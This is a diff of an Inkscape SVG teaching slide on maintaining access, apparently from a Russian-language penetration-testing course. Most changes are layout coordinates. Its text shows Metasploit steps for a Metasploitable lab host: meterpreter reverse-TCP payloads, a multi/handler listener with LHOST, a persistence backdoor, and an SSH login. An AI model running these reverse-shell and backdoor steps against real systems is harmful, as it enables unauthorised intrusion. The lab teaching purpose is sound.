@@ -6,7 +6,7 @@
    height="900"
    id="svg2"
    version="1.1"
-   inkscape:version="1.1.1 (3bf5ae0d25, 2021-09-20)"
+   inkscape:version="1.1.2 (0a00cf5339, 2022-02-04)"
    sodipodi:docname="kii_maintaining_access.svg"
    enable-background="new"
    xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
@@ -26,15 +26,15 @@
      inkscape:pageopacity="0.94117647"
      inkscape:pageshadow="2"
      inkscape:zoom="0.5"
-     inkscape:cx="586"
-     inkscape:cy="192"
+     inkscape:cx="585"
+     inkscape:cy="671"
      inkscape:document-units="px"
-     inkscape:current-layer="layer7"
+     inkscape:current-layer="layer3"
      showgrid="true"
      inkscape:window-width="1920"
-     inkscape:window-height="1018"
-     inkscape:window-x="-6"
-     inkscape:window-y="-6"
+     inkscape:window-height="1132"
+     inkscape:window-x="3840"
+     inkscape:window-y="0"
      inkscape:window-maximized="1"
      showguides="true"
      inkscape:guide-bbox="true"
@@ -6910,37 +6910,37 @@
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:32px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
          id="tspan7217">set payload java/meterpreter/reverse_tcp</tspan><tspan
-         y="440.95694"
+         y="439.90976"
          x="77.441345"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:32px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
-         id="tspan6834">set rhosts 10.0.2.6</tspan><tspan
-         y="480.40414"
+         id="tspan6834">set rhosts meta2</tspan><tspan
+         y="478.30975"
          x="77.441345"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:32px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
          id="tspan6847">set srvhost 10.0.2.8</tspan><tspan
-         y="518.80414"
+         y="516.70978"
          x="77.441345"
          sodipodi:role="line"
          id="tspan6845"
          style="font-size:32px" /><tspan
-         y="557.20416"
+         y="555.10974"
          x="77.441345"
          sodipodi:role="line"
          id="tspan7219"
          style="font-size:32px" /><tspan
-         y="595.60413"
+         y="593.50977"
          x="77.441345"
          sodipodi:role="line"
          id="tspan7221"
          style="font-size:32px" /><tspan
-         y="634.00415"
+         y="631.90979"
          x="77.441345"
          sodipodi:role="line"
          id="tspan7223"
          style="font-size:32px" /><tspan
-         y="672.40411"
+         y="670.30975"
          x="77.441345"
          sodipodi:role="line"
          id="tspan7225"
@@ -7060,7 +7060,7 @@
          x="77.441406"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">background</tspan><tspan
-         y="340.89731"
+         y="342.07538"
          x="77.441406"
          sodipodi:role="line"
          id="tspan6762-8" /></text>
@@ -7075,7 +7075,7 @@
          x="56.900848"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">Перевод активной сессии в фоновый режим</tspan><tspan
-         y="264.89731"
+         y="266.07538"
          x="56.900848"
          sodipodi:role="line"
          id="tspan11087-2" /></text>
@@ -7102,7 +7102,7 @@
          id="tspan6646"
          sodipodi:role="line"
          x="77.441406"
-         y="506.77408" /></text>
+         y="507.95215" /></text>
     <rect
        rx="19.999996"
        ry="20"
@@ -7133,7 +7133,7 @@
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
          id="tspan6656">exploit</tspan><tspan
-         y="762.91919"
+         y="764.09729"
          x="77.441406"
          sodipodi:role="line"
          id="tspan6660" /></text>
@@ -7151,7 +7151,7 @@
          id="tspan6667"
          sodipodi:role="line"
          x="56.900848"
-         y="604.89734" /></text>
+         y="606.07538" /></text>
     <text
        xml:space="preserve"
        style="font-style:normal;font-variant:normal;font-weight:bold;font-stretch:normal;line-height:120%;font-family:'Andale Mono';-inkscape-font-specification:'Andale Mono Bold';letter-spacing:0px;word-spacing:0px;display:inline;fill:#1f3c84;fill-opacity:1;stroke:none"
@@ -7166,7 +7166,7 @@
          id="tspan6673-4"
          sodipodi:role="line"
          x="56.900848"
-         y="432.55441" /></text>
+         y="433.73248" /></text>
   </g>
   <g
      inkscape:groupmode="layer"
@@ -7225,7 +7225,7 @@
          x="57.441406"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">use exploit/multi/handler</tspan><tspan
-         y="340.89731"
+         y="342.07538"
          x="57.441406"
          sodipodi:role="line"
          id="tspan6599" /></text>
@@ -7249,17 +7249,17 @@
          x="57.441406"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:32px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">set payload linux/x86/meterpreter_reverse_tcp</tspan><tspan
-         y="532.14062"
+         y="531.09344"
          x="57.441406"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:32px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
          id="tspan6607">set LHOST 10.0.2.8</tspan><tspan
-         y="571.58783"
+         y="569.49347"
          x="57.441406"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:32px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
          id="tspan6609">run</tspan><tspan
-         y="609.98779"
+         y="607.89343"
          x="57.441406"
          sodipodi:role="line"
          id="tspan6611"
@@ -7278,7 +7278,7 @@
          id="tspan6617"
          sodipodi:role="line"
          x="36.900848"
-         y="444.89731" /></text>
+         y="446.07538" /></text>
     <image
        xlink:href="img/apt_handler.png"
        width="583"
@@ -7299,7 +7299,7 @@
          x="36.900848"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">Активация бэкдора</tspan><tspan
-         y="684.89734"
+         y="686.07538"
          x="36.900848"
          sodipodi:role="line"
          id="tspan6761" /></text>
@@ -7326,7 +7326,7 @@
          id="tspan6770"
          sodipodi:role="line"
          x="57.441406"
-         y="760.89734" /></text>
+         y="762.07538" /></text>
   </g>
   <g
      inkscape:groupmode="layer"
@@ -7423,7 +7423,7 @@
          id="tspan7279"
          sodipodi:role="line"
          x="77.441406"
-         y="607.2973" /></text>
+         y="608.4754" /></text>
     <text
        id="text7287"
        y="423.50977"
@@ -7435,7 +7435,7 @@
          x="56.900856"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">Настройка и запуск эксплойта</tspan><tspan
-         y="444.89731"
+         y="446.07538"
          x="56.900856"
          sodipodi:role="line"
          id="tspan7285" /></text>
@@ -7450,7 +7450,7 @@
          x="56.900856"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:semi-condensed;font-size:36px;line-height:120%;font-family:'Lucida Console';-inkscape-font-specification:'Lucida Console, Semi-Condensed';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">Использование экслойта persistence</tspan><tspan
-         y="284.89731"
+         y="286.07538"
          x="56.900856"
          sodipodi:role="line"
          id="tspan7293" /></text>
@@ -7482,11 +7482,11 @@
          sodipodi:role="line"
          x="77.441406"
          y="759.50977"
-         id="tspan6569">ssh msfadmih@10.0.2.6</tspan><tspan
+         id="tspan6569">ssh msfadmin@meta2</tspan><tspan
          id="tspan6571"
          sodipodi:role="line"
          x="77.441406"
-         y="780.89734" /></text>
+         y="782.07538" /></text>
     <text
        xml:space="preserve"
        style="font-style:normal;font-variant:normal;font-weight:bold;font-stretch:normal;line-height:120%;font-family:'Andale Mono';-inkscape-font-specification:'Andale Mono Bold';letter-spacing:0px;word-spacing:0px;display:inline;fill:#1f3c84;fill-opacity:1;stroke:none"
@@ -7501,7 +7501,7 @@
          id="tspan6577"
          sodipodi:role="line"
          x="56.900856"
-         y="704.89734" /></text>
+         y="706.07538" /></text>
   </g>
   <g
      inkscape:groupmode="layer"
